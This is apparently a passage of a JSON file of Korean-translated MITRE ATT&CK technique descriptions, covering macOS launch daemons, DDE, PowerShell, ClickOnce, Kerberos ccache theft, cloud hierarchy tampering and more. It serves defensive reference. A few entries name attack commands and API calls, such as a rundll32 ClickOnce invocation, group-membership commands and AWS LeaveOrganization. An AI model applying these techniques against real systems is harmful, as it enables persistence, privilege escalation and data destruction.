    "title": "Launch Daemon",
    "description": "애플의 개발자 문서에 따르면, macOS 및 OS X가 부팅될 때 launchd가 실행되어 시스템 초기화를 완료합니다. 이 프로세스는 <code>/System/Library/LaunchDaemons</code> 및 <code>/Library/LaunchDaemons</code>에 있는 속성 목록(plist) 파일에서 각 요구 시작 시스템 수준 데몬의 매개변수를 로드합니다. 이러한 LaunchDaemons는 실행할 실행 파일을 가리키는 속성 목록 파일을 가지고 있습니다.\n\n침해자는 launchd나 launchctl를 사용하여 plist를 적절한 디렉토리에 로드함으로써 부팅 시 실행되도록 구성할 수 있는 새 런치 데몬을 설치할 수 있습니다. 데몬 이름은 관련 운영 체제나 무해한 소프트웨어의 이름을 사용하여 위장할 수 있습니다. Launch Daemons는 관리자 권한으로 생성할 수 있지만, 루트 권한으로 실행되므로 침해자는 서비스를 이용해 관리자 권한을 루트 권한으로 상승시킬 수도 있습니다.\n\nplist 파일의 권한은 root:wheel이어야 하지만, 그것이 가리키는 스크립트나 프로그램은 그런 요구사항이 없습니다. 따라서 잘못된 구성으로 인해 침해자가 현재 Launch Daemon의 실행 파일을 수정하고 지속성을 확보하거나 권한 상승을 할 수 있는 가능성이 있습니다.",
    "external_id": "T1160",
    "modified": "2020-03-19T15:08:50.043Z",
    "translated": true
  },
  {
    "title": "Dynamic Data Exchange",
    "description": "Windows 동적 데이터 교환(DDE)은 애플리케이션 간의 일회성 및/또는 지속적인 프로세스 간 통신(IPC)을 위한 클라이언트-서버 프로토콜입니다. 링크가 설정되면 애플리케이션은 문자열, 따뜻한 데이터 링크(데이터 항목이 변경될 때 알림), 뜨거운 데이터 링크(데이터 항목의 변경사항 복제), 및 명령 실행 요청을 포함하는 트랜잭션을 자율적으로 교환할 수 있습니다.\n\n객체 연결 및 포함(OLE) 또는 문서 간 데이터 링크 기능은 원래 DDE를 통해 구현되었습니다. COM에 의해 대체되었음에도 불구하고 DDE는 Windows 10 및 대부분의 Microsoft Office 2016에서 레지스트리 키를 통해 활성화될 수 있습니다.\n\n적대자는 DDE를 사용하여 임의의 명령을 실행할 수 있습니다. Microsoft Office 문서는 DDE 명령으로 오염될 수 있으며, 직접 또는 내장된 파일을 통해 실행할 수 있으며, 피싱 캠페인이나 호스팅된 웹 콘텐츠를 통해 실행을 전달하는 데 사용되어 Visual Basic for Applications(VBA) 매크로의 사용을 피할 수 있습니다. DDE는 또한 명령 줄 실행에 대한 직접적인 접근 권한이 없는 손상된 시스템에서 작동하는 적대자에 의해 활용될 수 있습니다.",
    "external_id": "T1173",
    "modified": "2022-02-09T20:22:43.284Z",
    "translated": true
  },
  {
    "title": "Steganography",
    "description": "적대자는 스테가노그래피 기법을 사용하여 탐지를 더욱 어렵게 만들기 위해 명령 및 제어 트래픽을 숨길 수 있다. 스테가노그래피 기법은 시스템 간에 전송되는 디지털 메시지에 데이터를 숨기는 데 사용될 수 있다. 이 숨겨진 정보는 손상된 시스템의 명령 및 제어에 사용될 수 있다. 경우에 따라, 이미지나 문서 파일과 같은 파일을 스테가노그래피를 사용하여 전달하는 것이 명령 및 제어에 활용될 수 있다.",
    "external_id": "T1001.002",
    "modified": "2020-03-15T00:37:58.963Z",
    "translated": true
  },
  {
    "title": "NTFS File Attributes",
    "description": "모든 NTFS(새로운 기술 파일 시스템) 포맷의 파티션에는 파티션 내의 모든 파일/디렉토리에 대한 기록을 유지하는 마스터 파일 테이블(MFT)이 포함되어 있습니다. MFT 항목 내에는 확장 속성(EA) 및 데이터(여러 데이터 속성이 존재할 때는 대체 데이터 스트림(ADS)으로 알려짐)와 같은 파일 속성이 포함되어 있어 임의의 데이터(심지어 완전한 파일)를 저장하는 데 사용할 수 있습니다.\n\n적대 세력은 파일에 직접 데이터를 저장하는 대신 파일 속성 메타데이터에 악성 데이터나 바이너리를 저장할 수 있습니다. 이는 정적 지표 스캔 도구 및 안티바이러스와 같은 일부 방어 수단을 회피하기 위해 수행될 수 있습니다.",
    "external_id": "T1096",
    "modified": "2020-03-13T21:04:13.284Z",
    "translated": true
  },
  {
    "title": "Service Execution",
    "description": "적대자는 서비스 제어 관리자와 같은 Windows 서비스와 상호작용하는 방법을 통해 이진 파일, 명령 또는 스크립트를 실행할 수 있습니다. 이는 새로운 서비스를 생성하거나 기존 서비스를 수정함으로써 이루어질 수 있습니다. 이 기술은 서비스 지속성 또는 권한 상승 중에 새로운 서비스와 기존 서비스 수정과 함께 사용되는 실행 방법입니다.",
    "external_id": "T1035",
    "modified": "2020-03-10T18:34:39.665Z",
    "translated": true
  },
  {
    "title": "PowerShell",
    "description": "PowerShell은 Windows 운영 체제에 포함된 강력한 대화형 명령줄 인터페이스 및 스크립팅 환경입니다. 적대자는 정보 검색 및 코드 실행을 포함한 여러 작업을 수행하기 위해 PowerShell을 사용할 수 있습니다. 예를 들어, 실행 파일을 실행하는 데 사용할 수 있는 Start-Process cmdlet과 로컬 또는 원격 컴퓨터에서 명령을 실행하는 Invoke-Command cmdlet이 있습니다.\n\nPowerShell은 또한 인터넷에서 실행 파일을 다운로드하고 실행하는 데 사용될 수 있으며, 이는 디스크에 저장하거나 메모리에서 직접 실행할 수 있습니다.\n\n원격 시스템에 연결하기 위해 PowerShell을 사용하려면 관리자 권한이 필요합니다.\n\n여러 PowerShell 기반 공격 테스트 도구가 있으며, PowerSploit 및 PSAttack이 있습니다.\n\nPowerShell 명령/스크립트는 PowerShell의 기본 System.Management.Automation 어셈블리에 직접 호출하지 않고도 실행될 수 있으며, 이는 .NET 프레임워크와 Windows 공통 언어 인터페이스(CLI)를 통해 노출됩니다.",
    "external_id": "T1086",
    "modified": "2020-03-09T13:51:06.334Z",
    "translated": true
  },
  {
    "title": "Custom Command and Control Protocol",
    "description": "적대자는 기존의 애플리케이션 계층 프로토콜에 명령/데이터를 캡슐화하는 대신 사용자 지정 명령 및 제어 프로토콜을 사용하여 통신할 수 있습니다. 구현에는 잘 알려진 프로토콜을 모방하거나 TCP/IP/다른 표준 네트워크 스택에서 제공하는 기본 프로토콜 위에 사용자 지정 프로토콜(원시 소켓 포함)을 개발하는 것이 포함됩니다.",
    "external_id": "T1094",
    "modified": "2020-03-20T19:03:04.295Z",
    "translated": true
  },
  {
    "title": "InstallUtil",
    "description": "InstallUtil은 .NET 바이너리에 지정된 특정 설치 구성 요소를 실행하여 리소스의 설치 및 제거를 가능하게 하는 명령줄 유틸리티입니다. InstallUtil은 Windows 시스템의 .NET 디렉터리에 위치해 있습니다. InstallUtil.exe는 Microsoft에 의해 디지털 서명되어 있습니다.\n\n공격자는 InstallUtil을 사용하여 신뢰할 수 있는 Windows 유틸리티를 통해 코드 실행을 프록시할 수 있습니다. 또한 InstallUtil은 바이너리 내에서 속성을 사용하여 프로세스 화이트리스트를 우회하는 데 사용될 수 있으며, 이 경우 속성 <code>[System.ComponentModel.RunInstaller(true)]</code>로 장식된 클래스를 실행합니다.",
    "external_id": "T1118",
    "modified": "2020-01-31T18:59:38.256Z",
    "translated": true
  },
  {
    "title": "Commonly Used Port",
    "description": "이 기술은 더 이상 사용되지 않습니다. 적절한 경우 비표준 포트를 사용하십시오.\n\n적대 세력은 방화벽이나 네트워크 탐지 시스템을 우회하고 정상적인 네트워크 활동과 혼합하여 보다 자세한 검사를 피하기 위해 일반적으로 사용되는 포트를 통해 통신할 수 있습니다. 그들은 일반적으로 열려 있는 포트를 사용할 수 있습니다.\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\n그들은 포트와 관련된 프로토콜을 사용하거나 완전히 다른 프로토콜을 사용할 수 있습니다.\n\n내부 구역 내에서 발생하는 연결(예: 프록시 또는 피벗 노드와 다른 노드 간의 연결)의 경우 일반적으로 사용되는 포트의 예는 다음과 같습니다.\n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)",
    "external_id": "T1043",
    "modified": "2022-07-22T18:51:42.238Z",
    "translated": true
  },
  {
    "title": "Domains",
    "description": "적대 세력은 타겟팅에 사용될 수 있는 도메인 및/또는 서브도메인을 가로챌 수 있습니다. 도메인 등록 가로채기는 원래 등록자의 허가 없이 도메인 이름의 등록을 변경하는 행위입니다. 적대 세력은 도메인의 소유자로 등록된 사람의 이메일 계정에 접근할 수 있습니다. 그런 다음 적대 세력은 비밀번호를 잊어버렸다고 주장하여 도메인 등록을 변경할 수 있습니다. 다른 가능성으로는 도메인 등록 지원 센터를 대상으로 하는 사회 공학적 공격을 통해 계정에 접근하거나, 갱신 프로세스의 취약점을 이용하거나, 도메인을 관리할 수 있는 클라우드 서비스에 침투하는 것이 있습니다.\n\n서브도메인 가로채기는 조직이 존재하지 않거나 제공이 중단된 자원을 가리키는 DNS 항목을 가지고 있을 때 발생할 수 있습니다. 이러한 경우, 적대 세력은 해당 도메인과 관련된 신뢰로 이득을 얻기 위해 서브도메인을 제어할 수 있습니다.\n\n도메인을 침해한 적대 세력은 기존의 DNS 기록을 유지하면서 그들의 통제 아래 악성 서브도메인을 생성하여 도메인 섀도잉을 수행할 수도 있습니다. 서비스가 중단되지 않기 때문에 악성 서브도메인은 오랜 시간 동안 감지되지 않을 수 있습니다.",
    "external_id": "T1584.001",
    "modified": "2024-09-24T15:10:40.270Z",
    "translated": true
  },
  {
    "title": "Windows Admin Shares",
    "description": "Windows 시스템에는 관리자만 접근할 수 있는 숨겨진 네트워크 공유가 있으며, 원격 파일 복사 및 기타 관리 기능을 제공한다. \n\n적대자는 관리 수준의 유효 계정과 함께 이 기술을 사용하여 서버 메시지 블록(SMB)을 통해 네트워크 시스템에 원격으로 접근하고, 원격 프로시저 호출(RPC)을 사용하여 시스템과 상호작용하며, 파일을 전송하고, 전송된 바이너리를 원격 실행을 통해 실행할 수 있다. SMB/RPC를 통한 인증된 세션에 의존하는 실행 기술로는 예약 작업/작업, 서비스 실행, Windows 관리 도구가 있다. 적대자는 또한 NTLM 해시를 사용하여 패스 더 해시 및 특정 구성 및 패치 수준을 가진 시스템의 관리자 공유에 접근할 수 있다.\n\nNet 유틸리티를 사용하여 유효한 자격증명을 가지고 원격 시스템의 Windows 관리자 공유에 연결할 수 있다.",
    "external_id": "T1077",
    "modified": "2020-03-23T19:54:12.651Z",
    "translated": true
  },
  {
    "title": "Modify Cloud Resource Hierarchy",
    "description": "적대자는 방어를 회피하기 위해 서비스로서의 인프라(IaaS) 환경에서 계층 구조를 수정하려고 할 수 있습니다. \n\nIaaS 환경은 종종 리소스를 계층적으로 그룹화하여 리소스 관리 및 관련 그룹에 정책을 적용하는 데 도움을 줍니다. 계층 구조는 클라우드 제공업체 간에 다를 수 있습니다. \n\n적대자는 IaaS 계층 내에서 리소스 그룹을 추가, 삭제 또는 수정할 수 있습니다. 예를 들어, Azure 환경에서 글로벌 관리자 계정에 접근한 적대자는 리소스를 배포할 새로운 구독을 생성할 수 있습니다. 그들은 또한 기존의 사용량 기반 구독을 피해자의 테넌트에서 적대자가 제어하는 테넌트로 전환하여 구독 탈취를 진행할 수 있습니다. 이렇게 하면 피해자의 컴퓨팅 리소스를 사용하더라도 피해자 테넌트에 로그가 생성되지 않습니다. \n\nAWS 환경에서 적대자는 주어진 계정 내 적절한 권한을 가진 경우 `LeaveOrganization` API를 호출하여 계정을 연결된 AWS 조직에서 분리시키고 이전 조직에서 부과한 서비스 제어 정책, 안전 장치 또는 제한을 제거할 수 있습니다. 또는 적대자는 AWS 조직 내에서 새로운 계정을 생성하기 위해 `CreateAccount` API를 호출할 수 있습니다. 이 계정은 결제 계정에 등록된 동일한 결제 방법을 사용하지만 기존 탐지나 서비스 제어 정책의 적용을 받지 않을 수 있습니다.",
    "external_id": "T1666",
    "modified": "2024-09-25T16:15:41.224Z",
    "translated": true
  },
  {
    "title": "Lifecycle-Triggered Deletion",
    "description": "위협자는 클라우드 저장소 버킷의 수명 주기 정책을 수정하여 저장된 모든 객체를 삭제할 수 있습니다.\n\n클라우드 저장소 버킷은 종종 사용자가 일정 기간 이후에 객체의 마이그레이션, 아카이브 또는 삭제를 자동화하도록 수명 주기 정책을 설정할 수 있게 허용합니다. 만약 위협 행위자가 이러한 정책을 수정할 수 있는 충분한 권한을 보유하고 있다면, 모든 객체를 한 번에 삭제할 수 있습니다.\n\n예를 들어, AWS 환경에서 'PutLifecycleConfiguration' 권한을 가진 위협자는 'PutBucketLifecycle' API 호출을 사용하여 S3 버킷에 수명 주기 정책을 적용하여 하루 후에 버킷 내의 모든 객체를 삭제할 수 있습니다. 데이터 파괴 행위는 갈취 및 금전적 절도를 목적으로 수행될 수 있으며, 위협자는 또한 [지표 제거]를 위해 클라우드 로그를 저장하는 버킷에 대해 이 작업을 수행할 수 있습니다.",
    "external_id": "T1485.001",
    "modified": "2024-10-16T21:27:02.481Z",
    "translated": true
  },
  {
    "title": "SMS Pumping",
    "description": "적대자는 SMS 펌핑을 위해 메시징 서비스를 이용할 수 있으며, 이는 시스템 및/또는 호스팅 서비스의 가용성에 영향을 미칠 수 있습니다. SMS 펌핑은 위협 행위자가 먼저 통신 제공자로부터 전화번호 세트를 얻은 다음, 피해자의 메시징 인프라를 활용하여 그 세트에 있는 번호로 대량의 SMS 메시지를 전송하는 일종의 통신 사기입니다. 자신의 전화번호 세트로 SMS 트래픽을 생성함으로써, 위협 행위자는 통신 제공자로부터 금전을 받을 수 있습니다.\n\n위협 행위자는 종종 일회용 비밀번호(OTP)나 계정 확인 필드와 같은 공개적으로 이용 가능한 웹 양식을 사용하여 SMS 트래픽을 생성합니다. 이러한 필드는 배경에서 Twilio, AWS SNS, Amazon Cognito와 같은 서비스를 활용할 수 있습니다. 대량의 요청에 반응하여 SMS 비용이 증가하고 통신 채널이 과부하에 걸릴 수 있습니다.",
    "external_id": "T1496.003",
    "modified": "2024-10-16T17:45:14.210Z",
    "translated": true
  },
  {
    "title": "Publish/Subscribe Protocols",
    "description": "적대자는 기존 트래픽과 섞이기 위해 발행/구독(pub/sub) 애플리케이션 계층 프로토콜을 사용하여 감지/네트워크 필터링을 피할 수 있습니다. 원격 시스템에 대한 명령과 종종 그 명령의 결과는 클라이언트와 서버 간의 프로토콜 트래픽에 내장됩니다.\n\nMQTT, XMPP, AMQP, STOMP와 같은 프로토콜은 발행/구독 설계를 사용하며, 메시지 분배는 중앙 집중식 브로커에 의해 관리됩니다. 발행자는 자신의 메시지를 주제에 따라 분류하고, 구독자는 구독한 주제에 따라 메시지를 수신합니다. 적대자는 메시지 브로커 뒤에서 자신의 제어 하에 있는 시스템과 통신하기 위해 발행/구독 프로토콜을 악용하면서 정상적인, 예상되는 트래픽을 모방할 수 있습니다.",
    "external_id": "T1071.005",
    "modified": "2024-10-16T13:08:35.629Z",
    "translated": true
  },
  {
    "title": "Ccache Files",
    "description": "적대자들은 자격 증명 캐시 파일(또는 ccache)에 저장된 Kerberos 티켓을 훔치려고 할 수 있습니다. 이러한 파일은 사용자의 활성 세션 자격 증명을 단기적으로 저장하는 데 사용됩니다. ccache 파일은 사용자 인증 시 생성되며, 사용자가 자격 증명을 다시 입력하지 않고도 여러 서비스에 접근할 수 있게 해줍니다.\n\n설정을 위한 파일과 환경 변수는 ccache 항목의 저장 위치를 설정하는 데 사용됩니다. Linux에서는 자격 증명이 일반적으로 `/tmp` 디렉토리에 `krb5cc_%UID%` 또는 `krb5.ccache` 형식으로 저장됩니다. macOS에서는 ccache 항목이 기본적으로 메모리에 `API:{uuid}` 형식으로 저장됩니다. 일반적으로 사용자들은 `kinit`를 사용하여 주체에 대한 티켓 발급 티켓(TGT)을 얻고, `klist`를 사용하여 자격 증명 캐시에 현재 보유하고 있는 티켓을 나열하는 등 티켓 저장소와 상호작용합니다. \n\n적대자들은 디스크에 저장된 ccache 파일에서 티켓을 수집하고 암호 없이 현재 사용자로 인증하여 티켓 전달 공격을 수행할 수 있습니다. 적대자들은 이러한 티켓을 사용하여 권한 상승을 수행하기 위해 권한이 있는 정당한 사용자로 가장할 수도 있습니다. Kekeo와 같은 도구를 사용하여 ccache 파일을 Windows 형식으로 변환하여 추가적인 측면 이동을 수행할 수도 있습니다. macOS에서는 적대자들이 오픈 소스 도구 또는 Kerberos 프레임워크를 사용하여 ccache 파일과 상호작용하고 하위 수준 API를 통해 TGT 또는 서비스 티켓을 추출할 수 있습니다.",
    "external_id": "T1558.005",
    "modified": "2024-10-14T21:26:37.856Z",
    "translated": true
  },
  {
    "title": "Additional Local or Domain Groups",
    "description": "적대자는 적대자가 제어하는 계정에 추가적인 로컬 또는 도메인 그룹을 추가하여 시스템이나 도메인에 대한 지속적인 접근을 유지할 수 있습니다.\n\nWindows에서는 `net localgroup` 및 `net group` 명령어를 사용하여 기존 사용자를 로컬 및 도메인 그룹에 추가할 수 있습니다. Linux에서는 적대자들이 같은 목적을 위해 `usermod` 명령어를 사용할 수 있습니다.\n\n예를 들어, 계정은 Windows 장치에서 로컬 관리자 그룹에 추가되어 권한을Elevate할 수 있습니다. 또한, Remote Desktop Users 그룹에 추가되어 향후 [원격 데스크톱 프로토콜]을 활용해 엔드포인트에 로그인할 수 있습니다. Linux에서는 계정이 sudoers 그룹에 추가되어 [Sudo 및 Sudo 캐싱]을 지속적으로 활용하여 권한을 Elevate할 수 있습니다.\n\nWindows 환경에서는 머신 계정이 도메인 그룹에 추가될 수도 있습니다. 이는 로컬 SYSTEM 계정이 도메인에서 권한을 얻을 수 있도록 합니다.",
    "external_id": "T1098.007",
    "modified": "2024-10-14T14:32:08.926Z",
    "translated": true
  },
  {
    "title": "Evil Twin",
    "description": "적대자는 사용자를 속이기 위해 겉보기에는 진짜처럼 보이는 Wi-Fi 액세스 포인트를 호스팅할 수 있으며, 이를 통해 네트워크 스니핑, 전송 데이터 조작 또는 입력 캡처와 같은 후속 행동을 지원할 수 있습니다.\n\n합법적인 Wi-Fi 네트워크의 서비스 세트 식별자(SSID)를 사용함으로써, 사기성 Wi-Fi 액세스 포인트는 장치나 사용자가 악성 Wi-Fi 네트워크에 연결하도록 속일 수 있습니다. 적대자는 또한 강한 신호 세기를 제공하거나 Wi-Fi 액세스 포인트에 대한 접근을 차단하여 희생 장치가 악성 네트워크에 연결하도록 강요하거나 유인할 수 있습니다. Wi-Fi 파인애플이라는 네트워크 보안 감사를 위한 침투 테스트 도구가 악성 쌍둥이 공격에서 사용될 수 있으며, 사용이 용이하고 더 넓은 범위를 제공합니다. 사용자 지정 인증서가 HTTPS 트래픽을 가로채기 위해 사용될 수 있습니다.\n\n유사하게, 적대자는 클라이언트 장치가 알려진 또는 이전에 연결된 네트워크(선호 네트워크 목록 또는 PNL)에 대해 프로브 요청을 보내는 것을 듣기도 합니다. 악성 액세스 포인트가 프로브 요청을 받으면, 적대자는 신뢰할 수 있는 알려진 네트워크를 모방하기 위해 동일한 SSID로 응답할 수 있습니다. 희생 장치는 응답한 액세스 포인트가 자신의 PNL에 있는 것이라고 믿고 사기성 네트워크와의 연결을 시작합니다.\n\n악성 Wi-Fi 액세스 포인트에 로그인하면 사용자는 피해자의 자격 증명을 캡처하기 위해 가짜 로그인 페이지나 캡티브 포털 웹페이지로 리디렉션될 수 있습니다. 사용자가 사기성 Wi-Fi 네트워크에 로그인하면 적대자는 네트워크 활동을 모니터링하거나 데이터를 조작하거나 추가 자격 증명을 훔칠 수 있습니다. 공공 Wi-Fi 액세스가 많은 장소, 예를 들면 공항, 커피숍 또는 도서관은 적대자가 불법적인 Wi-Fi 액세스 포인트를 설정하기 위한 목표가 될 수 있습니다.",
    "external_id": "T1557.004",
    "modified": "2024-11-11T18:52:53.686Z",
    "translated": true
  },
  {
    "title": "Mutual Exclusion",
    "description": "적대자는 악성 코드와 관련된 뮤텍스의 존재에 따라 실행이나 행동을 제한할 수 있습니다. 뮤텍스는 리소스에 대한 접근을 동기화하는 데 사용되는 Locking 메커니즘입니다. 특정 시점에 단 하나의 스레드 또는 프로세스만 뮤텍스를 획득할 수 있습니다.\n\n로컬 뮤텍스는 특정 프로세스 내에서만 존재하여 여러 스레드가 리소스에 대한 접근을 동기화할 수 있게 하지만, 시스템 뮤텍스는 여러 프로세스의 활동을 동기화하는 데 사용할 수 있습니다. 특정 악성 코드와 연관된 고유한 시스템 뮤텍스를 생성함으로써 적대자는 시스템이 이미 손상되었는지 여부를 확인할 수 있습니다.\n\n리눅스 환경에서는 악성 코드가 대신 뮤텍스 파일에 대한 잠금을 획득하려고 시도할 수 있습니다. 악성 코드가 잠금을 획득하면 계속 실행되며, 실패하면 두 번째 인스턴스를 생성하지 않기 위해 종료합니다.\n\n뮤텍스 이름은 하드코딩되거나 예측 가능한 알고리즘을 사용하여 동적으로 생성될 수 있습니다.",
    "external_id": "T1480.002",
    "modified": "2024-10-28T16:22:25.431Z",
    "translated": true
  },
  {
    "title": "Bandwidth Hijacking",
    "description": "적대자는 협력된 시스템의 네트워크 대역폭 자원을 활용하여 자원 집약적인 작업을 완료할 수 있으며, 이는 시스템 및/또는 호스팅된 서비스의 가용성에 영향을 미칠 수 있습니다.\n\n적대자는 또한 시스템의 네트워크 대역폭을 봇넷의 일부로 활용하는 악성 소프트웨어를 사용할 수 있으며, 이를 통해 서비스 거부 공격을 원활하게 하거나 악성 토렌트를 퍼뜨릴 수 있습니다. 또는 피해자의 네트워크 대역폭과 IP 주소를 프록시 서비스에 판매하여 프록시 재킹에 관여할 수 있습니다. 마지막으로, 추가적인 타겟을 식별하기 위해 인터넷 전반에 걸쳐 스캐닝을 수행할 수 있습니다.\n\n이 기술은 잠재적인 재정 비용이나 가용성 중단을 초래할 수 있을 뿐만 아니라, 피해자의 대역폭이 불법 활동에 사용될 경우 평판 피해를 초래할 수 있습니다.",
    "external_id": "T1496.002",
    "modified": "2024-09-25T14:59:35.287Z",
    "translated": true
  },
  {
    "title": "Cloud Service Hijacking",
    "description": "적대 세력은 자원 집약적인 작업을 완료하기 위해 손상된 소프트웨어-서비스(SaaS) 응용 프로그램을 활용할 수 있으며, 이는 호스팅된 서비스의 가용성에 영향을 미칠 수 있습니다.\n\n예를 들어, 적대 세력은 많은 양의 스팸 이메일 및 SMS 메시지를 보내기 위해 이메일 및 메시징 서비스를 활용할 수 있습니다. 또는 리버스 프록시를 활용하여 클라우드에 호스팅된 AI 모델의 성능을 가로채는 LLM 재킹에 참여할 수 있습니다.\n\n경우에 따라, 적대 세력은 피해자가 이미 사용하고 있는 서비스를 활용할 수 있습니다. 다른 경우에는, 특히 서비스가 더 큰 클라우드 플랫폼의 일부인 경우, 그들은 먼저 서비스를 활성화할 수 있습니다. SaaS 응용 프로그램을 활용하면 피해자가 상당한 재정적 비용을 발생시키고, 서비스 할당량을 초과 사용하며, 그 외에도 가용성에 영향을 미칠 수 있습니다.",
    "external_id": "T1496.004",
    "modified": "2024-10-16T17:59:27.535Z",
    "translated": true
  },
  {
    "title": "Compute Hijacking",
    "description": "적대자들은 획득한 시스템의 컴퓨팅 자원을 활용하여 자원 집약적인 작업을 완료할 수 있으며, 이로 인해 시스템 및 호스팅 서비스의 가용성에 영향을 줄 수 있습니다.\n\n컴퓨트 하이재킹의 일반적인 목적 중 하나는 암호화폐 네트워크의 거래를 검증하고 가상 통화를 얻는 것입니다. 적대자들은 시스템 자원을 충분히 소비하여 부정적인 영향을 미치거나 영향을 받은 기계가 응답하지 않게 만들 수 있습니다. 서버와 클라우드 기반 시스템은 가용 자원의 높은 가능성 때문에 일반적인 목표가 되지만, 사용자 엔드포인트 시스템도 손상되어 컴퓨트 하이재킹 및 암호화폐 채굴에 사용될 수 있습니다. 컨테이너화된 환경도 외부 API를 통한 배치 용이성과 여러 컨테이너를 환경이나 클러스터 내에서 배치하거나 손상시켜 채굴 활동을 확장할 수 있는 가능성으로 인해 표적이 될 수 있습니다.\n\n또한, 일부 암호화폐 채굴 악성코드는 경쟁하는 악성코드의 프로세스를 식별하고 종료하여 자원 경쟁을 방지합니다.",
    "external_id": "T1496.001",
    "modified": "2024-10-13T16:58:38.820Z",
    "translated": true
  },
  {
    "title": "Lua",
    "description": "적대자는 Lua 명령어와 스크립트를 악용하여 실행할 수 있습니다. Lua는 주로 애플리케이션에 내장용으로 설계된 크로스 플랫폼 스크립팅 및 프로그래밍 언어입니다. Lua는 명령줄에서 실행되거나, 스크립트를 통해, 또는 Lua가 내장된 프로그램을 통해 실행될 수 있습니다.\n\n적대자는 악의적인 목적을 위해 Lua 스크립트를 실행할 수 있습니다. 적대자는 기존의 Lua 인터프리터를 통합, 악용 또는 교체하여 런타임에서 악의적인 Lua 명령 실행을 허용할 수 있습니다.",
    "external_id": "T1059.011",
    "modified": "2024-10-01T15:19:54.163Z",
    "translated": true
  },
  {
    "title": "Polymorphic Code",
    "description": "적대자는 탐지를 피하기 위해 다형성 코드(메타모픽 코드 또는 변이 코드라고도 함)를 사용할 수 있습니다. 다형성 코드는 코드 실행 중에 런타임 풋프린트를 변경할 수 있는 소프트웨어의 일종입니다. 소프트웨어가 실행될 때마다 코드는 원래와 동일한 목적이나 목표를 달성하는 다른 버전으로 변형됩니다. 이 기능은 악성 소프트웨어가 전통적인 서명 기반 방어(예: 바이러스 백신 및 악성 소프트웨어 방지 도구)를 피할 수 있게 합니다. \n다양한 난독화 기술이 다형성 코드와 함께 사용되어 의도된 효과를 달성할 수 있으며, 여기에는 변형 엔진을 사용하여 작업을 수행하는 것이 포함됩니다.",
    "external_id": "T1027.014",
    "modified": "2024-10-09T18:56:28.092Z",
    "translated": true
  },
  {
    "title": "Customer Relationship Management Software",
    "description": "적대자들은 고객 관계 관리(CRM) 소프트웨어를 활용하여 귀중한 정보를 채굴할 수 있습니다. CRM 소프트웨어는 조직이 고객 상호작용을 추적하고 관리하며 고객 데이터를 저장하는 데 도움을 주기 위해 사용됩니다.\n\n적대자들이 피해 조직에 접근하게 되면, CRM 소프트웨어에서 고객 데이터를 채굴할 수 있습니다. 여기에는 전체 이름, 이메일, 전화번호, 주소와 같은 개인 식별 정보(PII)와 구매 이력 및 IT 지원 상호작용과 같은 추가 세부 정보가 포함될 수 있습니다. 이러한 데이터를 수집함으로써 적대자는 개인화된 피싱 이메일을 보내거나 SIM 스와핑을 진행하거나 금융 이익을 얻거나 추가 조직의 타겟이 되는 방식으로 조직의 고객을 겨냥할 수 있습니다.\n\nCRM 소프트웨어는 온프레미스 또는 클라우드에서 호스팅될 수 있습니다. 이러한 솔루션에 저장된 정보는 특정 인스턴스나 환경에 따라 다를 수 있습니다.",
    "external_id": "T1213.004",
    "modified": "2024-10-17T14:36:24.983Z",
    "translated": true
  },
  {
    "title": "ClickOnce",
    "description": "적대자는 ClickOnce 애플리케이션(.appref-ms 및 .application 파일)을 사용하여 신뢰할 수 있는 Windows 유틸리티를 통해 코드 실행을 프록시할 수 있습니다. ClickOnce는 사용자가 최소한의 사용자 상호작용으로 파일 공유 또는 웹 페이지에서 설치하고 실행할 수 있는 자동 업데이트 Windows 기반 .NET 애플리케이션(.XBAP, .EXE 또는 .DLL)을 만드는 배포 방식입니다. 애플리케이션은 DFSVC.EXE의 자식 프로세스으로 시작되며, 이 프로세스는 애플리케이션의 설치, 실행 및 업데이트를 책임집니다.\n\nClickOnce 애플리케이션은 제한된 권한만을 받기 때문에 설치에 관리자 권한이 필요하지 않습니다. 따라서 적대자는 권한 상승 없이 ClickOnce를 악성 코드의 실행을 프록시하는 데 악용할 수 있습니다.\n\nClickOnce는 여러 가지 방식으로 악용될 수 있습니다. 예를 들어, 적대자는 사용자 실행에 의존할 수 있습니다. 사용자가 악성 웹사이트를 방문할 경우, .NET 악성코드는 합법적인 소프트웨어로 위장되어 설치를 위한 ClickOnce 팝업이 표시됩니다.\n\n또한, 적대자는 `rundll32.exe dfshim.dll,ShOpenVerbApplication1` 명령을 사용하여 Rundll32 스크립트를 통해 악성 코드를 실행하기 위해 ClickOnce를 악용할 수 있습니다.\n\n추가로, 적대자는 ClickOnce 애플리케이션 파일을 원격 사용자의 시작 폴더로 이동시켜 지속적인 악성 코드 배포를 할 수 있습니다.",
    "external_id": "T1127.002",
    "modified": "2024-10-17T18:50:41.474Z",
    "translated": true
  },
  {
    "title": "Relocate Malware",
    "description": "페이로드가 배포된 후, 공격자는 피해 시스템에 동일한 맬웨어 복사본을 생성하여 그들의 존재에 대한 증거를 제거하거나 방어를 피할 수 있습니다. 맬웨어 페이로드를 새로운 위치로 복사하는 것은 이전의 유물을 정리하기 위해 파일 삭제와 결합될 수 있습니다.\n\n맬웨어를 재배치하는 것은 방어를 회피하기 위한 여러 행동의 일환일 수 있습니다. 예를 들어, 공격자는 환경에 더 잘 혼합되도록 페이로드를 복사하고 이름을 변경할 수 있습니다. 페이로드는 또한 특정 위치와 관련하여 지속성을 확립하기 위해 파일/경로 제외를 목표로 하도록 재배치될 수 있습니다.\n\n악성 페이로드의 재배치는 방어 분석을 방해할 수도 있으며, 특히 이러한 페이로드를 이전 사건(예: 사용자 실행 및 피싱)과 구분하는 데 도움이 됩니다.",
    "external_id": "T1070.010",
    "modified": "2024-10-13T15:48:46.391Z",
    "translated": true
  },
  {
    "title": "Masquerade Account Name",
